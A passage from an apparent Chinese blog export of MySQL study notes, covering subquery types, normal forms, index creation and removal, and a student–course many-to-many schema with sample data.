<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> products <span class="token keyword">where</span> price <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">avg</span><span class="token punctuation">(</span>price<span class="token punctuation">)</span> <span class="token keyword">from</span> products<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112234543998.png" alt="image-20231112234543998"></p>
</li>
<li><p>from型：将内层查询结果在from后起别名作为临时表使用</p>
</li>
<li><p>exist型：把外层查询结果拿到内层结果去比较</p>
</li>
<li><p>标量子查询：一行一列</p>
</li>
<li><p>列子查询：一列多行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 价格&lt;2000的商品来自那个分类</span>
<span class="token keyword">select</span> <span class="token operator">*</span>  <span class="token keyword">from</span> category <span class="token keyword">where</span> cid <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">distinct</span> category_id <span class="token keyword">from</span> products <span class="token keyword">where</span> price <span class="token operator">&lt;</span> <span class="token number">2000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231112235405944.png" alt="image-20231112235405944"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 家电和鞋服分类下所有商品信息</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> products <span class="token keyword">where</span> category_id <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">select</span> cid <span class="token keyword">from</span> category  <span class="token keyword">where</span> cname <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'家电'</span><span class="token punctuation">,</span><span class="token string">'鞋服'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113000518723.png" alt="image-20231113000518723"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 价格>500元的商品名称、价格、分类</span>
<span class="token keyword">select</span> p<span class="token punctuation">.</span>pname<span class="token punctuation">,</span>p<span class="token punctuation">.</span>price<span class="token punctuation">,</span>c<span class="token punctuation">.</span>cname <span class="token keyword">from</span> products p <span class="token keyword">left</span> <span class="token keyword">join</span> category c <span class="token keyword">on</span> p<span class="token punctuation">.</span>category_id<span class="token operator">=</span>c<span class="token punctuation">.</span>cid <span class="token keyword">where</span> p<span class="token punctuation">.</span>price<span class="token operator">></span><span class="token number">500</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113001017333.png" alt="image-20231113001017333"></p>
</li>
<li><p>行子查询：一行多列</p>
</li>
<li><p>表子查询：二维表</p>
</li>
</ul>
<h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><ul>
<li><p>第一范式</p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113001714895.png" alt="image-20231113001714895"></p>
</li>
<li><p>第二范式</p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113001914551.png" alt="image-20231113001914551"></p>
</li>
<li><p>第三范式</p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113002109752.png" alt="image-20231113002109752"></p>
</li>
<li><p>反三范式</p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113002558960.png" alt="image-20231113002558960"></p>
</li>
</ul>
<h2 id="mysql索引"><a href="#mysql索引" class="headerlink" title="mysql索引"></a>mysql索引</h2><blockquote>
<p>数据库设计时，对字段建立引用，从而提升查询字段数据的效率。</p>
</blockquote>
<ul>
<li><p>目录结构</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> mysql
<span class="token builtin class-name">cd</span> /opt/homebrew/var/mysql
<span class="token function">ls</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231121185336465.png" alt="image-20231121185336465">索引分类</p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231121185911693.png" alt="image-20231121185911693"></p>
<ul>
<li><p>普通索引。配合条件查询、排序使用</p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231121190348135.png" alt="image-20231121190348135"></p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">use multi_table_query;

-- 创建表时建索引
create table index_tab(
	did int,
	name VARCHAR(20),
	hobby VARCHAR(30),
	address VARCHAR(30),
	index index_name(name)
);

-- 字段建索引index_hobby
create index index_hobby on index_tab(hobby);

-- alter建索引
alter table index_tab add index index_address(address);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231121191438222.png" alt="image-20231121191438222"></p>
</li>
<li><p>唯一索引。索引的列只能出现一次。</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 和建普通索引一样，只不过都在index前加了unique
create table uni_index_tab(
	did int,
	name VARCHAR(20),
	hobby VARCHAR(30),
	address VARCHAR(30),
	unique index index_name(name)
);
create unique index index_hobby on uni_index_tab(hobby);
alter table uni_index_tab add unique index index_address(address);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231121193104137.png" alt="image-20231121193104137"></p>
</li>
<li><p>主键索引。主键是唯一性索引，用于标识数据表中某条记录.not null</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 添加主键索引
alter table 表名 add primary key(字段名);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li><p>```mysql<br>– 删除普通索引/唯一索引<br>alter table 表名 drop index 索引名;<br>alter table uni_index_tab drop index index_name;<br>– 删除主键索引(前提条件是非自增主键auto_increment)<br>alter table 表名 drop primary key;<br>– 取消主键自增<br>alter table 表名 modify 主键字段 字段类型;</p>
<pre class="line-numbers language-none"><code class="language-none">
# 多表查询

## 多表关系

* 一对一

  ![image-20231113011730264](.&#x2F;Mysql数据库基础-袁庭新&#x2F;image-20231113011730264.png)

* 一对多![image-20231113003747711](.&#x2F;Mysql数据库基础-袁庭新&#x2F;image-20231113003747711.png)

* 多对多

  ![image-20231113003905377](.&#x2F;Mysql数据库基础-袁庭新&#x2F;image-20231113003905377.png)

&#96;&#96;&#96;sql
CREATE database if not exists multi_table_query;
use multi_table_query;
CREATE table student(
		id int auto_increment primary key comment &#39;主键ID&#39;,
		name varchar(10) comment &#39;姓名&#39;,
		no varchar(10) comment &#39;学号&#39;
)comment &#39;学生表&#39;;

insert into student values (null,&#39;戴医生&#39;,&#39;001&#39;),(null,&#39;谢逊&#39;,&#39;002&#39;),(null,&#39;殷天正&#39;,&#39;003&#39;),(null,&#39;韦一笑&#39;,&#39;004&#39;)



CREATE table course(
		id int auto_increment PRIMARY key comment &#39;主键ID&#39;,
		name varchar(10) comment &#39;课程名称&#39;
) comment &#39;课程表&#39;;

insert into course values (null,&#39;java&#39;),(null,&#39;php&#39;),(null,&#39;mysql&#39;),(null,&#39;hadoop&#39;)


create table student_course(
		id int auto_increment comment &#39;主键&#39; primary key,
		studentid int not null comment &#39;学生ID&#39;,
		courseid int not null comment &#39;课程ID&#39;,
		constraint fk_courseid foreign key (courseid) REFERENCES course (id),
		constraint fk_studentid foreign key (studentid) REFERENCES student (id)
) comment &#39;学生课程中间表&#39;;
insert into student_course values(null,1,1),(null,1,2),(null,1,3),(null,2,2),(null,2,3),(null,3,4)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113011228840.png" alt="image-20231113011228840"></p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113011246360.png" alt="image-20231113011246360"></p>
<p><img src="/2023/08/21/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80-%E8%A2%81%E5%BA%AD%E6%96%B0/image-20231113011340961.png" alt="image-20231113011340961"></p>
]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
</search>
